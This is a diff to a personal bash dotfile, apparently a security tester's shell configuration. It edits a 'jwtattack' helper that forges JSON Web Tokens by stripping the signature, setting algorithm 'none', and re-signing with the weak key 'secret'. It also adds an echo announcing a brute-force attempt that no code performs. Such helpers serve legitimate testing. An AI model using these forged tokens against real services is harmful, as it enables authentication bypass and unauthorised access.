@@ -183,28 +183,17 @@ os_clean() { unset OS_AUTH_URL OS_TENANT_NAME OS_USERNAME OS_PASSWORD OS_REGION_
 # Password generation
 genpass() { < /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c"${1:-32}";echo; }
 
-dockshell() {
-
-    if [ "$#" -eq 0 ]; then
-        IMAGE=precurse/security-tools
-    elif [ "$#" -eq 1 ]; then
-        IMAGE=$1
-    else
-        echo "Usage: ${FUNCNAME[0]} [image name]"
-        return
-    fi
-
-    sudo docker run -v "${PWD}":"${PWD}" -w "${PWD}" -it "${IMAGE}"
-}
-
 jwtdecode() {
-  echo -n $@ | python3 -c 'import jwt;import sys; e=sys.stdin.read();print("Header: ",jwt.get_unverified_header(e));print("Body: ",jwt.decode(e, options={"verify_signature": False}))'
+  printf "%s" "$@" | python3 -c 'import jwt;import sys; e=sys.stdin.read();print("Header: ",jwt.get_unverified_header(e));print("Body: ",jwt.decode(e, options={"verify_signature": False}))'
 }
 
 jwtattack() {
-echo -n $@ | python3 -c 'import jwt;import sys; e=sys.stdin.read();print("Null Signature: ",e[:e.rindex(".''")+1])'
-echo -n $@ | python3 -c 'import jwt;import sys; e=sys.stdin.read();j=jwt.decode(e,options={"verify_signature":False});h=jwt.get_unverified_header(e);h.pop("alg");print("None algoritm: ",jwt.encode(j, key="", algorithm="none",headers=h))'
-echo -n $@ | python3 -c 'import jwt;import sys; e=sys.stdin.read();j=jwt.decode(e,options={"verify_signature":False});h=jwt.get_unverified_header(e);h.pop("alg");print("Secret key HS256: ",jwt.encode(j, key="secret", algorithm="HS256",headers=h))'
+ printf "%s" "$@" | python3 -c 'import jwt;import sys; e=sys.stdin.read();print("Null Signature: ",e[:e.rindex(".''")+1])'
+ printf "%s" "$@" | python3 -c 'import jwt;import sys; e=sys.stdin.read();j=jwt.decode(e,options={"verify_signature":False});h=jwt.get_unverified_header(e);h.pop("alg");print("None algoritm: ",jwt.encode(j, key="", algorithm="none",headers=h))'
+printf "%s" "$@" | python3 -c 'import jwt;import sys; e=sys.stdin.read();j=jwt.decode(e,options={"verify_signature":False});h=jwt.get_unverified_header(e);h.pop("alg");print("Secret key HS256: ",jwt.encode(j, key="secret", algorithm="HS256",headers=h))'
+
+echo "Attempting to brute force key if HS256"
+
 }
 
 ######
@@ -243,19 +232,20 @@ start_agent() {
   env ssh-agent | sed 's/^echo/#echo/' > "${SSH_ENV}"
   echo succeeded
   chmod 600 "${SSH_ENV}"
-  # shellcheck source=/home/piranha/.ssh/environment
+  # shellcheck source=/dev/null
   . "${SSH_ENV}" > /dev/null
   env ssh-add;
 }
 
 # Source SSH settings, if applicable
 # SSH_AUTH_SOCKET for ssh-agent forwarding
-if [ ! -z "${SSH_AUTH_SOCK}" ]; then
+if [ -n "${SSH_AUTH_SOCK}" ]; then
   echo "Forwarded SSH Agent Found"
 
 elif [ -f "${SSH_ENV}" ]; then
+  # shellcheck disable=SC1090
   . "${SSH_ENV}" > /dev/null
-  ps -p ${SSH_AGENT_PID} > /dev/null || {
+  ps -p "${SSH_AGENT_PID}" > /dev/null || {
       start_agent;
   }
 else
